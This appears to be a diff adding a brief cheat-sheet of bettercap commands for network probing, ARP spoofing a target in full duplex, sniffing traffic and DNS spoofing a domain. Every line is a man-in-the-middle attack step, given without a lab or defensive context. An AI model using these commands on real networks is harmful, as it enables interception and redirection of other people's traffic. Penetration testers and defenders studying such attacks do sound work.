@@ -1,0 +1,40 @@
+Run bettercap
+--------------
+>> bettercap
+
+net probe ON/OFF
+----------------
+#on
+>> net.probe on 
+#off
+>> net.probe off
+
+show available devices
+-----------------------
+>> net.show
+
+arp spoofing
+------------
+set targets : 
+arp.spoof.targets [target ip address]
+>> set arp.spoof.targets 192.168.29.5
+
+set full duplex (spoof both gateway and target) :
+>> set arp.spoof.fullduplex true
+
+start arp spoof
+>> arp.spoof on
+
+
+sniff
+------
+net.sniff on
+
+dns spoofing
+-------------
+set the domain name to spoof : 
+set dns.spoof.domains [domain to spoof]
+>> set dns.spoof.domains abcdefg.com
+
+start dns spoof :
+>> dns.spoof on
